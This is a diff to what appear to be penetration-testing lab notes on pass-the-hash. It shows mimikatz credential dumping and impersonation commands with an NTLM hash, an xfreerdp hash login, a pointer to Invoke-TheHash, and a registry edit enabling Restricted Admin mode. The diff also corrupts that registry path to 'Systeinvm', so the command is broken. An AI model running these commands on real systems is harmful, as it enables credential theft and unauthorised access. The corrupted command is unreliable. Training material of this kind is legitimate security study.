@@ -23,7 +23,14 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 * `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
 * `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
 
+> Note that: Mimikatz is one of the most useful tools that we will be using in the future for active directory boxes. Some additional points to be noted about Mimikatz.
+>
+> 1. You can run it with just mimikatz.exe and then slowly specify other commands.
+> 2. To extract the hashes presented in the current session, instead of running `sekurlsa::pth` we can run `sekurlsa::logonpasswords` additional information could be found in the [`HackTricks`](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz) website
+
 ### Invoke-TheHash(PS)
+
+To download the tools, access [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) github.
 
 ```powershell-session
 Import-Module .\Invoke-TheHash.psd1
@@ -85,7 +92,7 @@ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 > To enable run:
 >
 > ```cmd-session
-> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+> reg add HKLM\Systeinvm\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 > ```
 >
 > &#x20;Otherwise we will get the following error.
